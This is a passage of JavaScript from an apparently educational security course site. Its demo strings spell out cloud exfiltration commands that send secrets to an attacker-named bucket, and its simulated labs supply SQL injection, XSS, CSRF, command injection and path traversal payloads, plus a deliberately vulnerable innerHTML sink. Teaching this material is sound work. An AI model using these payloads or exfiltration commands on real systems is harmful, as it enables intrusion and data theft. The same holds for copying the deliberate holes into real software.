            exotic: 'EXOTIC COVERT CHANNELS:\n\n  ELECTROMAGNETIC:\n  ┌────────────────────────────────────┐\n  │ • TEMPEST: Monitor EM emissions    │\n  │ • AirHopper: FM radio from GPU     │\n  │ • USBee: USB EM emanations         │\n  └────────────────────────────────────┘\n\n  OPTICAL:\n  ┌────────────────────────────────────┐\n  │ • LED-it-GO: HDD LED blinking      │\n  │ • aIR-Jumper: Security camera IR   │\n  │ • Keyboard LED covert channel      │\n  └────────────────────────────────────┘\n\n  THERMAL:\n  ┌────────────────────────────────────┐\n  │ • BitWhisper: Heat between PCs     │\n  │ • Very slow (~8 bits/hour)         │\n  └────────────────────────────────────┘\n\n  POWER LINE:\n  ┌────────────────────────────────────┐\n  │ • PowerHammer: Power consumption   │\n  │ • Data encoded in power draw       │\n  └────────────────────────────────────┘\n\n  ⚠️ All very low bandwidth\n  ⚠️ Nation-state level attacks'
        };
        $('#acousticOut').textContent = data.airgap;
        $$('#acousticTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#acousticTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#acousticOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C10 Lesson 9: cloud-exfiltration - Cloud Storage Exfiltration
    function demoCloudExfiltration(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">EXFIL</span><span class="demo-title">Cloud Storage Exfiltration</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="cloudTabs">
                <button class="demo-btn demo-btn-sm active" data-t="apis">Cloud APIs</button>
                <button class="demo-btn demo-btn-sm" data-t="services">Legitimate Services</button>
                <button class="demo-btn demo-btn-sm" data-t="detect">Detection</button>
            </div>
            <div id="cloudOut" style="background:#1a1a1a;color:#f97583;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            apis: 'CLOUD API EXFILTRATION:\n\n  # AWS S3\n  aws s3 cp secret.txt s3://attacker-bucket/\n\n  # Google Cloud Storage\n  gsutil cp secret.txt gs://attacker-bucket/\n\n  # Azure Blob Storage\n  az storage blob upload \\\n    --account-name attackerstorage \\\n    --container exfil \\\n    --file secret.txt\n\n  # Using stolen credentials\n  export AWS_ACCESS_KEY_ID=AKIA...\n  export AWS_SECRET_ACCESS_KEY=...\n  aws s3 sync /sensitive/ s3://bucket/\n\n  WHY CLOUD APIS?\n  ┌────────────────────────────────────┐\n  │ ✓ TLS encrypted                    │\n  │ ✓ Looks like legitimate traffic    │\n  │ ✓ High bandwidth                   │\n  │ ✓ Hard to block without breaking   │\n  │   legitimate business use          │\n  └────────────────────────────────────┘',
            services: 'LEGITIMATE SERVICES ABUSE:\n\n  FILE SHARING:\n  ┌────────────────────────────────────┐\n  │ # Dropbox                          │\n  │ curl -X POST \\                     │\n  │   https://content.dropboxapi.com/  │\n  │   2/files/upload \\                 │\n  │   -H "Authorization: Bearer $TKN"  │\n  │   --data-binary @secret.txt        │\n  │                                    │\n  │ # Google Drive (rclone)            │\n  │ rclone copy secrets/ gdrive:exfil/ │\n  │                                    │\n  │ # OneDrive, Box, Mega, etc.        │\n  └────────────────────────────────────┘\n\n  PASTEBIN SERVICES:\n  ┌────────────────────────────────────┐\n  │ curl -X POST pastebin.com/api \\    │\n  │   -d "api_paste_code=$(cat file)"  │\n  └────────────────────────────────────┘\n\n  SOCIAL MEDIA:\n  • Twitter DMs (encoded data)\n  • Discord webhooks\n  • Telegram bots\n  • Slack incoming webhooks',
            detect: 'CLOUD EXFILTRATION DETECTION:\n\n  NETWORK MONITORING:\n  ┌────────────────────────────────────┐\n  │ • Unusual cloud API destinations   │\n  │ • Large uploads to personal cloud  │\n  │ • Cloud sync client traffic spikes │\n  │ • OAuth token usage from new IPs   │\n  └────────────────────────────────────┘\n\n  CLOUD AUDIT LOGS:\n  ┌────────────────────────────────────┐\n  │ # AWS CloudTrail                   │\n  │ • PutObject to unknown buckets     │\n  │ • Cross-account access             │\n  │                                    │\n  │ # GCP Audit Logs                   │\n  │ # Azure Activity Logs              │\n  └────────────────────────────────────┘\n\n  DLP SOLUTIONS:\n  ┌────────────────────────────────────┐\n  │ • CASB (Cloud Access Security)     │\n  │ • Inspect cloud API calls          │\n  │ • Block unauthorized cloud apps    │\n  │ • Monitor file sharing patterns    │\n  └────────────────────────────────────┘\n\n  ⚠️ Balance security vs productivity'
        };
        $('#cloudOut').textContent = data.apis;
        $$('#cloudTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#cloudTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#cloudOut').textContent = data[b.dataset.t];
            };
        });
    }

    // Backward compatibility
    function demoExfiltration(pane) { demoExfiltrationIntro(pane); }


    /* ============================================================
       LAB EXERCISES
       ============================================================ */
    function renderLab(lesson) {
        const pane = $('#pane-lab');
        const slug = lesson.slug || '';
        const labKey = (lesson.labHtml || slug).replace('-lab', '');
        const generators = {
            'sql-injection': labSQLi,
            'sqli-lab': labSQLi,
            'sqli': labSQLi,
            'cross-site-scripting': labXSS,
            'xss-lab': labXSS,
            'xss': labXSS,
            'csrf-attack': labCSRF,
            'csrf-lab': labCSRF,
            'csrf': labCSRF,
            'broken-authentication': labBrokenAuth,
            'brokenauth-lab': labBrokenAuth,
            'brokenauth': labBrokenAuth,
            'auth-lab': labBrokenAuth,
            'auth': labBrokenAuth,
            'idor': labIDOR,
            'idor-lab': labIDOR,
            'command-injection': labCmdI,
            'cmdi-lab': labCmdI,
            'cmdi': labCmdI,
            'path-traversal': labPath,
            'path-lab': labPath,
            'path': labPath,
            'security-misconfiguration': labMisconfig,
            'misconfig-lab': labMisconfig,
            'misconfig': labMisconfig,
            'sql-injection-101': labSQLi,
            'xss-101': labXSS,
            'csrf-101': labCSRF,
            'broken-auth-101': labBrokenAuth,
            'idor-101': labIDOR,
            'command-injection-101': labCmdI,
            'path-traversal-101': labPath,
            'security-misconfig-101': labMisconfig,
            'file-inclusion': labFileInclusion,
            'file-inclusion-101': labFileInclusion,
            'lfi': labFileInclusion,
            'fi-lab': labFileInclusion,

            // C1 Labs
            'motherboard-lab': labBoard,
            'motherboards': labBoard,
            'cpu-lab': labCPU,
            'cpus-processing': labCPU,
            'ram-lab': labRAM,
            'ram-storage': labRAM,
            'binary-lab': labBinary,
            'bits-bytes-bases': labBinary,
            'ascii-lab': labASCII,
            'ascii-encoding': labASCII,
            'base64-lab': labBase64,
            'base64-encoding': labBase64,
            'fileheader-lab': labFileHeaders,
            'file-headers': labFileHeaders,
            'logic-lab': labLogicGates,
            'boolean-logic': labLogicGates,
            'xor-lab': labXOR,
            'xor-encryption': labXOR,
            'fs-lab': labFS,
            'file-systems-overview': labFS,
            'cloud-lab': labCloud,
            'cloud-models': labCloud,
            // C2 Labs
            'os-lab': labOS,
            'os-fundamentals': labOS,
            'vm-lab': labVM,
            'vms-hypervisors': labVM,
            // C3 Labs
            'terminal-lab': labTerminal,
            'linux-terminal': labTerminal,
            'sudo-lab': labSudo,
            'superuser-sudo': labSudo,
            'folders-lab': labFolders,
            'linux-folders': labFolders,
            'permissions-lab': labPermissions,
            'file-permissions': labPermissions,
            'env-lab': labEnv,
            'env-variables': labEnv,
            'fileops-lab': labFileOps2,
            'file-operations': labFileOps2,
            'search-lab': labSearch2,
            'search-commands': labSearch2,
            'process-lab': labProcess2,
            'processes': labProcess2,
            'pipes-lab': labPipes2,
            'pipes-redirects': labPipes2,
            'ssh-lab': labSSH2,
            'ssh-building': labSSH2,
            // C4 Labs
            'dorks-lab': labDorks,
            'google-dorks': labDorks,
            'http-lab': labHTTP2,
            'http-protocol': labHTTP2,
            'cookies-lab': labCookies2,
            'cookies-storage': labCookies2,
            // C5 Labs
            'hardware-lab': labHardware2,
            'network-hardware': labHardware2,
            'ip-lab': labIP2,
            'ip-addresses': labIP2,
            'tcpudp-lab': labTCPUDP2,
            'tcp-vs-udp': labTCPUDP2,
            'subnet-lab': labSubnet2,
            'subnetting': labSubnet2,
            'spf-lab': labSPF2,
            'email-spoofing-spf': labSPF2,
            'dns-lab': labDNS2,
            'dns-records': labDNS2,
            'osi-lab': labOSI2,
            'osi-model': labOSI2,
            'dos-lab': labDoS2,
            'dos-attacks': labDoS2,
            // C6 new labs
            'session-lab': labSession,
            'session-guessing': labSession,
            'clickjack-lab': labClickjack,
            'clickjacking': labClickjack,
            'dirtraversal-lab': labDirTraversal,
            'directory-traversal': labDirTraversal,
            'upload-lab': labUpload,
            'file-upload': labUpload,
            'bof-lab': labBOF2,
            'buffer-overflow-intro': labBOF2,
            'intoverflow-lab': labIntOverflow,
            'integer-overflow': labIntOverflow,
            'msf-lab': labMSF,
            'metasploit': labMSF,
            'phishing-lab': labPhishing2,
            'phishing': labPhishing2,
            'privesc-lab': labPrivEsc2,
            'privesc-intro': labPrivEsc2,
            'suid-lab': labSUID2,
            'privesc-suid-sudo': labSUID2,
            'winprivesc-lab': labWinPrivEsc2,
            'privesc-windows': labWinPrivEsc2,
            // C7 Servers & Services Labs
            'intro-to-servers': labServerIntro,
            'server-hardware': labServerIntro,
            'server-software': labServerIntro,
            'types-of-servers': labServerIntro,
            'server-challenges': labServerIntro,
            'server-connectivity': labServerIntro,
            'web-server-intro': labWebServer,
            'what-are-web-servers': labWebServer,
            'how-web-servers-work': labWebServer,
            'web-server-analytics': labWebServer,
            'web-server-errors': labWebServer,
            'web-server-config': labWebServer,
            'db-server-intro': labDBServer,
            'database-logic': labDBServer,
            'sql-server-setup': labDBServer,
            'db-admin-tools': labDBServer,
            'dns-server-intro': labDNSServer,
            'dns-theory-practice': labDNSServer,
            'personal-dns-server': labDNSServer,
            'dns-security': labDNSServer,
            'dns-over-https-tls': labDNSServer,
            'dnssec': labDNSServer,
            'log-server-intro': labLogServer,
            'basic-log-setup': labLogServer,
            'sim-sem-siem': labLogServer,
            'log-tools-comparison': labLogServer,
            'security-vs-privacy': labLogServer,
            'log-best-practices': labLogServer,
            'email-server-intro': labEmailServer,
            'smtp-imap-pop3': labEmailServer,
            'email-send-process': labEmailServer,
            'spam-filters': labEmailServer,
            'email-response-codes': labEmailServer,
            'mime-email': labEmailServer,
            'email-server-setup': labEmailServer,
            // C8 Advanced Hardware Labs
            'cpu-arch-intro': labCPUArch,
            'cpu-components-adv': labCPUArch,
            'cpu-registers': labCPUArch,
            'fetch-decode-execute': labCPUArch,
            'stack-and-heap': labCPUArch,
            'tracking-execution': labGDB,
            'gdb-setup': labGDB,
            'debugging-techniques': labGDB,
            'debugging-challenge': labGDB,
            'adv-storage-intro': labRAID,
            'raid-explained': labRAID,
            'cloud-storage-mech': labRAID,
            'container-intro': labDocker,
            'containers-vs-vms': labDocker,
            'docker-intro': labDocker,
            'docker-cli-basics': labDocker,
            // C9 Security Concepts Labs
            'encryption-intro': labEncryption,
            'what-is-encryption': labEncryption,
            'encryption-vs-encoding': labEncryption,
            'symmetric-encryption': labEncryption,
            'asymmetric-encryption': labEncryption,
            'https-tls': labEncryption,
            'hashing-security': labEncryption,
            'security-law-intro': labEncryption,
            'law-cybersecurity': labEncryption,
            'getting-caught': labEncryption,
            'ethics-security': labEncryption,
            'responsible-disclosure': labEncryption,
            'security-fund-intro': labEncryption,
            'red-vs-blue-team': labForensics,
            'defense-in-depth': labEncryption,
            'risk-management': labEncryption,
            'critical-security-controls': labEncryption,
            'stages-of-attack': labEncryption,
            'security-distros-intro': labSecDistros,
            'slingshot-sift': labSecDistros,
            'kali-linux': labSecDistros,
            'wordlists-security': labSecDistros,
            'recon-intro': labRecon,
            'google-dorking-robots': labRecon,
            'job-posting-osint': labRecon,
            'cewl-wordlists': labRecon,
            'prior-breaches': labRecon,
            'whois-lookup': labRecon,
            'dns-recon': labRecon,
            'nmap-scanning': labRecon,
            'forensics-intro': labForensics,
            'evidence-chain-custody': labForensics,
            'steganography': labForensics,
            'event-logs-forensics': labForensics,
            'file-integrity-hashes': labForensics,
            'incident-response': labForensics,
            'security-teams-forensics': labForensics,
            'fs-forensics-intro': labForensics,
            'file-system-analysis': labForensics,
            'disk-capture': labForensics,
            'deleted-file-recovery': labForensics,
            'email-forensics': labForensics,
            'windows-registry-forensics': labForensics,
            'forensic-tools': labForensics,
            'anti-forensics': labForensics,
            'memory-forensics-intro': labForensics,
            'memory-analysis': labForensics,
            'memory-captures': labForensics,
            'volatility-framework': labForensics,
            'network-forensics': labForensics,
            'wireshark-tcpdump': labForensics,
            'pcap-analysis': labForensics,
            // C10 Network Infiltration Labs
            'persistence-intro': labPersistence,
            'persistence-mechanisms': labPersistence,
            'startup-items-persist': labPersistence,
            'shortcut-hijacking': labPersistence,
            'rootkits': labPersistence,
            'office-persistence': labPersistence,
            'yara-rules': labPersistence,
            'lateral-movement-intro': labLateral,
            'lateral-movement-tech': labLateral,
            'arp-cache-poisoning': labLateral,
            'port-scanning-lateral': labLateral,
            'credential-extraction': labLateral,
            'mitm-lateral': labLateral,
            'psexec-remote': labLateral,
            'exfiltration-intro': labExfiltration,
            'exfiltration-techniques': labExfiltration,
            'https-exfiltration': labExfiltration,
            'smtp-exfiltration': labExfiltration,
            'irc-exfiltration': labExfiltration,
            'dns-exfiltration': labExfiltration,
            'icmp-exfiltration': labExfiltration,
            'acoustic-exfiltration': labExfiltration,
            'cloud-exfiltration': labExfiltration,
        };

        const gen = generators[slug] || generators[labKey];
        if (gen) gen(pane, lesson);
        else if (lesson.labHtml && lesson.labHtml.trim()) {
            pane.innerHTML = lesson.labHtml;
            // Execute any scripts in the lab HTML
            pane.querySelectorAll('script').forEach(oldScript => {
                const newScript = document.createElement('script');
                newScript.textContent = oldScript.textContent;
                oldScript.parentNode.replaceChild(newScript, oldScript);
            });
        }
        else pane.innerHTML = '<div class="empty-state"><div class="icon">🔬</div><p>Lab exercise coming soon.</p></div>';
    }

    function labSQLi(pane) {
        pane.innerHTML = `
            <div class="lab-exercise">
                <div class="lab-briefing">
                    <div class="lab-objective"><div class="lab-obj-icon">🎯</div>
                        <div><h4>Objective: Bypass the Login Form</h4>
                        <p>The login form below is vulnerable to SQL injection. Your goal is to log in as the <strong>admin</strong> user without knowing the password.</p></div>
                    </div>
                    <div class="lab-rules">
                        <div class="rule"><span class="rule-icon">📋</span> The backend query is: <code>SELECT * FROM users WHERE username='INPUT' AND password='INPUT'</code></div>
                        <div class="rule"><span class="rule-icon">🏁</span> Success condition: The query returns at least one row (authentication bypassed)</div>
                    </div>
                </div>

                <div class="lab-workspace">
                    <div class="lab-terminal">
                        <div class="terminal-header"><span class="terminal-dots">●●●</span> SQL Injection Lab</div>
                        <div class="terminal-body">
                            <div class="lab-field"><label>Username</label><input class="lab-input" id="labSqliUser" placeholder="Enter username…"></div>
                            <div class="lab-field"><label>Password</label><input class="lab-input" id="labSqliPass" placeholder="Enter password…"></div>
                            <div class="lab-query-preview">
                                <span class="preview-label">Generated SQL Query</span>
                                <div id="labSqliPreview">SELECT * FROM users WHERE username='' AND password=''</div>
                            </div>
                            <button class="btn btn-primary" id="labSqliSubmit">Submit Login</button>
                        </div>
                    </div>
                </div>
                <div class="lab-result hidden" id="labSqliResult"></div>
                <div class="lab-hints">
                    <button class="btn-hint" data-hint="1">💡 Hint 1</button>
                    <button class="btn-hint" data-hint="2">💡 Hint 2</button>
                    <button class="btn-hint" data-hint="3">💡 Hint 3</button>
                    <div class="hint-box hidden" id="labSqliHint"></div>
                </div>
            </div>`;

        const userI = $('#labSqliUser'), passI = $('#labSqliPass');
        const preview = $('#labSqliPreview'), result = $('#labSqliResult');

        function updatePreview() {
            preview.textContent = `SELECT * FROM users WHERE username='${userI.value}' AND password='${passI.value}'`;
        }
        userI.oninput = updatePreview;
        passI.oninput = updatePreview;

        const hints = {
            '1': 'Think about what characters have special meaning in SQL. The single quote (<code>\'</code>) is used to delimit strings.',
            '2': 'Try making the WHERE clause always true. The expression <code>1=1</code> is always true.',
            '3': 'Use <code>\' OR \'1\'=\'1\' --</code> as the username. The <code>--</code> comments out the password check.',
        };

        $$('.btn-hint').forEach((b) => {
            b.onclick = () => { const h = $('#labSqliHint'); h.innerHTML = hints[b.dataset.hint]; h.classList.remove('hidden'); };
        });

        $('#labSqliSubmit').onclick = () => {
            const u = userI.value, p = passI.value;
            const sql = `SELECT * FROM users WHERE username='${u}' AND password='${p}'`;
            const bypassed = sql.includes("OR") && (sql.includes("1'='1") || sql.includes("1=1")) || sql.includes("--") && sql.includes("'");

            result.classList.remove('hidden');
            if (bypassed) {
                result.className = 'lab-result success';
                result.innerHTML = '✅ <strong>Success!</strong> You bypassed the authentication! The query returned the admin user row because the WHERE clause was made always true.';
                submitLabResult(state.currentLesson, true);
            } else {
                result.className = 'lab-result failure';
                result.innerHTML = '❌ <strong>Not quite.</strong> The login was not bypassed. Try manipulating the SQL query structure using special characters.';
            }
        };
    }

    function labXSS(pane) {
        pane.innerHTML = `
            <div class="lab-exercise">
                <div class="lab-briefing">
                    <div class="lab-objective"><div class="lab-obj-icon">🎯</div>
                        <div><h4>Objective: Execute JavaScript via XSS</h4>
                        <p>The comment box below renders user input without sanitization. Inject a payload that triggers a JavaScript alert.</p></div>
                    </div>
                    <div class="lab-rules">
                        <div class="rule"><span class="rule-icon">🏁</span> Success: The output contains an executable script tag or event handler</div>
                    </div>
                </div>
                <div class="lab-workspace">
                    <div class="lab-terminal">
                        <div class="terminal-header"><span class="terminal-dots">●●●</span> XSS Lab</div>
                        <div class="terminal-body">
                            <div class="lab-field"><label>Comment Input</label><textarea class="lab-input" id="labXssInput" rows="3" placeholder="Enter your comment…"></textarea></div>
                            <div class="lab-preview-section">
                                <span class="preview-label">Rendered Output (innerHTML)</span>
                                <div class="lab-preview-box" id="labXssPreview"></div>
                            </div>
                            <button class="btn btn-primary" style="margin-top:12px" id="labXssSubmit">Post Comment</button>
                        </div>
                    </div>
                </div>
                <div class="lab-result hidden" id="labXssResult"></div>
                <div class="lab-hints">
                    <button class="btn-hint" data-hint="1">💡 Hint 1</button>
                    <button class="btn-hint" data-hint="2">💡 Hint 2</button>
                    <div class="hint-box hidden" id="labXssHint"></div>
                </div>
            </div>`;

        const hints = { '1': 'Try using HTML tags that can execute JavaScript, like <code>&lt;script&gt;</code> or <code>&lt;img onerror&gt;</code>.', '2': 'Try: <code>&lt;img src=x onerror="alert(1)"&gt;</code>' };
        $$('.btn-hint').forEach((b) => { b.onclick = () => { const h = $('#labXssHint'); h.innerHTML = hints[b.dataset.hint]; h.classList.remove('hidden'); }; });

        $('#labXssSubmit').onclick = () => {
            const val = $('#labXssInput').value;
            $('#labXssPreview').innerHTML = val; // Intentionally vulnerable for demo
            const result = $('#labXssResult');
            const hasXss = /<script/i.test(val) || /on\w+\s*=/i.test(val) || /javascript:/i.test(val);
            result.classList.remove('hidden');
            if (hasXss) {
                result.className = 'lab-result success';
                result.innerHTML = '✅ <strong>Success!</strong> Your XSS payload was injected and would execute JavaScript in a real browser context.';
                submitLabResult(state.currentLesson, true);
            } else {
                result.className = 'lab-result failure';
                result.innerHTML = '❌ <strong>Not quite.</strong> Your input didn\'t contain executable JavaScript. Try using HTML tags with event handlers.';
            }
        };
    }

    function labCSRF(pane) {
        pane.innerHTML = `
            <div class="lab-exercise">
                <div class="lab-briefing">
                    <div class="lab-objective"><div class="lab-obj-icon">🎯</div>
                        <div><h4>Objective: Craft a CSRF Attack</h4>
                        <p>Write an HTML form that would automatically transfer money from a victim's bank account. The bank's transfer endpoint is <code>POST /transfer</code> with parameters <code>to</code> and <code>amount</code>.</p></div>
                    </div>
                </div>
                <div class="lab-workspace">
                    <div class="lab-terminal">
                        <div class="terminal-header"><span class="terminal-dots">●●●</span> CSRF Lab</div>
                        <div class="terminal-body">
                            <div class="lab-field"><label>Write your malicious HTML</label>
                            <textarea class="lab-input" id="labCsrfInput" rows="8" placeholder='<form action="https://bank.com/transfer" method="POST">&#10;  ...&#10;</form>'></textarea></div>
                            <button class="btn btn-primary" id="labCsrfSubmit">Verify Payload</button>
                        </div>
                    </div>
                </div>
                <div class="lab-result hidden" id="labCsrfResult"></div>
                <div class="lab-hints">
                    <button class="btn-hint" data-hint="1">💡 Hint</button>
                    <div class="hint-box hidden" id="labCsrfHint"></div>
                </div>
            </div>`;

        $$('.btn-hint').forEach((b) => { b.onclick = () => { const h = $('#labCsrfHint'); h.innerHTML = 'Create a form with <code>action</code> pointing to the bank transfer URL, hidden inputs for <code>to</code> and <code>amount</code>, and auto-submit with <code>&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code>.'; h.classList.remove('hidden'); }; });

        $('#labCsrfSubmit').onclick = () => {
            const val = $('#labCsrfInput').value.toLowerCase();
            const result = $('#labCsrfResult');
            const hasForm = val.includes('<form') && val.includes('method');
            const hasAction = val.includes('action') && (val.includes('transfer') || val.includes('bank'));
            const hasHidden = val.includes('hidden') || (val.includes('name=') && val.includes('value='));
            result.classList.remove('hidden');
            if (hasForm && hasAction && hasHidden) {
                result.className = 'lab-result success';
                result.innerHTML = '✅ <strong>Success!</strong> Your CSRF payload correctly targets the bank\'s transfer endpoint with hidden parameters. When a logged-in user loads this page, their browser would automatically send the request with their session cookie.';
                submitLabResult(state.currentLesson, true);
            } else {
                result.className = 'lab-result failure';
                let msg = '❌ <strong>Not quite.</strong> Your payload is missing: ';
                const missing = [];
                if (!hasForm) missing.push('a <form> element with method attribute');
                if (!hasAction) missing.push('action pointing to the transfer endpoint');
                if (!hasHidden) missing.push('hidden input fields for parameters');
                result.innerHTML = msg + missing.join(', ') + '.';
            }
        };
    }

    function labBrokenAuth(pane) {
        pane.innerHTML = `
            <div class="lab-exercise">
                <div class="lab-briefing">
                    <div class="lab-objective"><div class="lab-obj-icon">🎯</div>
                        <div><h4>Objective: Identify Authentication Weaknesses</h4>
                        <p>Review the code below and list all the security issues you can find.</p></div>
                    </div>
                </div>
                <div class="lab-workspace">
                    <div class="lab-terminal">
                        <div class="terminal-header"><span class="terminal-dots">●●●</span> Code Review Lab</div>
                        <div class="terminal-body">
                            <pre class="code-example" style="background:#1a202c;color:#e2e8f0;padding:16px;border-radius:8px;font-size:0.82rem;line-height:1.7">public boolean login(String user, String pass) {
    // No rate limiting
    String query = "SELECT * FROM users WHERE username='" 
        + user + "' AND password='" + pass + "'";
    ResultSet rs = stmt.executeQuery(query);
    if (rs.next()) {
        session.setAttribute("user", user);
        // Session ID not regenerated
        return true;
    }
    // No failed attempt logging
    return false;
}

// Password storage
public void register(String user, String pass) {
    String query = "INSERT INTO users VALUES('" 
        + user + "', '" + pass + "')";
    // Plaintext password storage!
    stmt.executeUpdate(query);
}</pre>
                            <div class="lab-field" style="margin-top:16px">
                                <label>List the vulnerabilities (one per line)</label>
                                <textarea class="lab-input" id="labAuthInput" rows="6" placeholder="1. SQL Injection in login query&#10;2. &#10;3. "></textarea>
                            </div>
                            <button class="btn btn-primary" id="labAuthSubmit">Check Answers</button>
                        </div>
                    </div>
                </div>
                <div class="lab-result hidden" id="labAuthResult"></div>
            </div>`;

        const keywords = ['sql injection', 'plaintext', 'plain text', 'no rate limit', 'rate limit', 'session', 'session fixation', 'not regenerat', 'no log', 'brute force', 'no hash', 'unhash', 'concatenat'];

        $('#labAuthSubmit').onclick = () => {
            const val = $('#labAuthInput').value.toLowerCase();
            const found = keywords.filter((k) => val.includes(k));
            const result = $('#labAuthResult');
            result.classList.remove('hidden');
            if (found.length >= 3) {
                result.className = 'lab-result success';
                result.innerHTML = `✅ <strong>Excellent!</strong> You identified ${found.length} vulnerabilities. Key issues: SQL Injection, plaintext passwords, no rate limiting, session fixation, no logging of failed attempts.`;
                submitLabResult(state.currentLesson, true);
            } else {
                result.className = 'lab-result failure';
                result.innerHTML = `❌ You found ${found.length} issue(s). Look for at least 3. Consider: input handling, password storage, session management, and missing security controls.`;
            }
        };
    }

    function labIDOR(pane) {
        pane.innerHTML = `
            <div class="lab-exercise">
                <div class="lab-briefing">
                    <div class="lab-objective"><div class="lab-obj-icon">🎯</div>
                        <div><h4>Objective: Access Another User's Data</h4>
                        <p>You are logged in as user ID 1001. Find a way to access the admin's profile (user ID 1000).</p></div>
                    </div>
                </div>
                <div class="lab-workspace">
                    <div class="lab-terminal">
                        <div class="terminal-header"><span class="terminal-dots">●●●</span> IDOR Lab</div>
                        <div class="terminal-body">
                            <div class="lab-field"><label>API Endpoint</label><input class="lab-input" id="labIdorInput" value="/api/users/1001/profile"></div>
                            <button class="btn btn-primary" id="labIdorSubmit">Send Request</button>
                        </div>
                    </div>
                </div>
                <div class="lab-result hidden" id="labIdorResult"></div>
            </div>`;

        $('#labIdorSubmit').onclick = () => {
            const val = $('#labIdorInput').value;
            const result = $('#labIdorResult');
            result.classList.remove('hidden');
            if (val.includes('1000')) {
                result.className = 'lab-result success';
                result.innerHTML = '✅ <strong>Success!</strong> You accessed the admin\'s profile by changing the user ID from 1001 to 1000. The API didn\'t verify that you are authorized to view this user\'s data.';
                submitLabResult(state.currentLesson, true);
            } else if (val.includes('1001')) {
                result.className = 'lab-result failure';
                result.innerHTML = '❌ That\'s your own profile. Try changing the user ID to access someone else\'s data.';
            } else {
                result.className = 'lab-result failure';
                result.innerHTML = '❌ User not found. The admin\'s ID is close to yours (1001). Try nearby numbers.';
            }
        };
    }

    function labCmdI(pane) {
        pane.innerHTML = `
            <div class="lab-exercise">
                <div class="lab-briefing">
                    <div class="lab-objective"><div class="lab-obj-icon">🎯</div>
                        <div><h4>Objective: Execute a System Command</h4>
                        <p>The ping tool executes <code>ping -c 4 [INPUT]</code>. Inject a command to read <code>/etc/hostname</code>.</p></div>
                    </div>
                </div>
                <div class="lab-workspace">
                    <div class="lab-terminal">
                        <div class="terminal-header"><span class="terminal-dots">●●●</span> Command Injection Lab</div>
                        <div class="terminal-body">
                            <div class="lab-field"><label>Hostname to Ping</label><input class="lab-input" id="labCmdiInput" placeholder="Enter hostname…"></div>
                            <div class="lab-query-preview"><span class="preview-label">Command Executed</span><div id="labCmdiPreview">ping -c 4 </div></div>
                            <button class="btn btn-primary" id="labCmdiSubmit">Execute</button>
                        </div>
                    </div>
                </div>
                <div class="lab-result hidden" id="labCmdiResult"></div>
                <div class="lab-hints">
                    <button class="btn-hint" data-hint="1">💡 Hint</button>
                    <div class="hint-box hidden" id="labCmdiHint"></div>
                </div>
            </div>`;

        const input = $('#labCmdiInput');
        input.oninput = () => { $('#labCmdiPreview').textContent = `ping -c 4 ${input.value}`; };

        $$('.btn-hint').forEach((b) => { b.onclick = () => { const h = $('#labCmdiHint'); h.innerHTML = 'Use a command separator like <code>;</code> or <code>&&</code> to chain a second command. Try: <code>8.8.8.8; cat /etc/hostname</code>'; h.classList.remove('hidden'); }; });

        $('#labCmdiSubmit').onclick = () => {
            const val = input.value;
            const result = $('#labCmdiResult');
            result.classList.remove('hidden');
            const hasInjection = /[;|&]/.test(val) && (/cat|less|more|head|tail|type/.test(val) || /hostname|passwd|etc/.test(val));
            if (hasInjection) {
                result.className = 'lab-result success';
                result.innerHTML = '✅ <strong>Success!</strong> You injected a command using a separator. The server executed both the ping AND your injected command.';
                submitLabResult(state.currentLesson, true);
            } else {
                result.className = 'lab-result failure';
                result.innerHTML = '❌ <strong>Not quite.</strong> You need to use a command separator to chain an additional command after the ping.';
            }
        };
    }

    function labPath(pane) {
        pane.innerHTML = `
            <div class="lab-exercise">
                <div class="lab-briefing">
                    <div class="lab-objective"><div class="lab-obj-icon">🎯</div>
                        <div><h4>Objective: Read a Sensitive File</h4>
                        <p>The file viewer serves files from <code>/var/www/docs/</code>. Use path traversal to read <code>/etc/passwd</code>.</p></div>
                    </div>
                </div>
                <div class="lab-workspace">
                    <div class="lab-terminal">
                        <div class="terminal-header"><span class="terminal-dots">●●●</span> Path Traversal Lab</div>
                        <div class="terminal-body">
                            <div class="lab-field"><label>Filename</label><input class="lab-input" id="labPathInput" placeholder="Enter filename…"></div>
                            <div class="lab-query-preview"><span class="preview-label">Resolved Path</span><div id="labPathPreview">/var/www/docs/</div></div>
                            <button class="btn btn-primary" id="labPathSubmit">View File</button>
                        </div>
                    </div>
                </div>
                <div class="lab-result hidden" id="labPathResult"></div>
                <div class="lab-hints">
                    <button class="btn-hint" data-hint="1">💡 Hint</button>
                    <div class="hint-box hidden" id="labPathHint"></div>
                </div>
            </div>`;

        const input = $('#labPathInput');
        input.oninput = () => { $('#labPathPreview').textContent = `/var/www/docs/${input.value}`; };
        $$('.btn-hint').forEach((b) => { b.onclick = () => { const h = $('#labPathHint'); h.innerHTML = 'Use <code>../</code> to go up directories. From <code>/var/www/docs/</code> you need to go up 3 levels to reach <code>/</code>, then navigate to <code>etc/passwd</code>.'; h.classList.remove('hidden'); }; });

        $('#labPathSubmit').onclick = () => {
            const val = input.value;
            const result = $('#labPathResult');
            result.classList.remove('hidden');
            if (val.includes('..') && val.includes('etc/passwd')) {
                result.className = 'lab-result success';
                result.innerHTML = '✅ <strong>Success!</strong> You used directory traversal (<code>../</code>) to escape the document root and read /etc/passwd.';
                submitLabResult(state.currentLesson, true);
            } else {
                result.className = 'lab-result failure';
                result.innerHTML = '❌ <strong>Not quite.</strong> You need to traverse up from /var/www/docs/ to reach /etc/passwd.';
            }
        };
    }

    function labMisconfig(pane) {
        pane.innerHTML = `
            <div class="lab-exercise">
                <div class="lab-briefing">
                    <div class="lab-objective"><div class="lab-obj-icon">🎯</div>
                        <div><h4>Objective: Fix Security Headers</h4>
                        <p>The server response is missing critical security headers. Add the correct headers and values.</p></div>
                    </div>
                </div>
                <div class="lab-workspace">
                    <div class="lab-terminal">
